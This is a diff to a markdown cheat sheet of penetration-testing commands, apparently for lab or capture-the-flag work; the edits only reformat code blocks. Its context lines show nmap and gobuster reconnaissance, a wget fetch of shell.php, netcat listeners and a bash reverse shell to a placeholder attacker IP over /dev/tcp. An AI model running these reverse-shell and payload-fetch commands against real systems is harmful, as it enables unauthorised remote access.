@@ -18,7 +18,8 @@ nmap -sC -sV <Target IP>
 `gobuster - Directory/file & DNS busting tool written in Go`
 ```
 gobuster dir -u http://<Target IP> -w /usr/share/wordlists/dirb/big.txt
-
+```
+```
 gobuster dir -u http://<Target VHost> -w /usr/share/wordlists/dirb/big.txt
 ```
 > dir - the classic directory brute-forcing mode
@@ -60,7 +61,8 @@ wget http://IP:5555/shell.php
 `nc - TCP/IP swiss army knife`
 ```
 netcat -lvnp 4444
-
+```
+```
 netcat -lvnp 1234
 ```
 > -l    listen mode, for inbound connects
@@ -99,5 +101,6 @@ bash -l >& /dev/tcp/<ATTACK MACHINE IP>/<PORT> 0>&1
 ```
 
 > -l -> Make bash act as if it had been invoked as a login shell
+
 
 ---
